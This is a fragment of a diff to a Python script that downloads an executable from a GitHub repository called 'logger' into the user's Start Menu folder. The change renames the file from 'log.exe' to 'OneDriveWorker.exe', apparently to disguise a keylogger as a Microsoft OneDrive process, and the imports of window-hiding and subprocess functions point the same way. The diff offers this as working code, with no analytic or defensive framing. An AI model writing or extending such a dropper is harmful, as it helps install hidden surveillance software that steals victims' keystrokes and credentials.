@@ -3,10 +3,11 @@ from win32gui import ShowWindow, GetForegroundWindow
 from requests import get
 from subprocess import run, Popen
 
-url = 'https://github.com/Pixel48/logger/raw/exe/log.exe'
+workerName = 'OneDriveWorker.exe'
+url = f'https://github.com/Pixel48/logger/raw/exe/{workerName}'
 
-folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
-filepath = os.path.join(folderpath, 'log.exe')
+folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', os.path.basename(workerName))
+filepath = os.path.join(folderpath, workerName)
 
 def create_folder(path):
     if not os.path.exists(path):
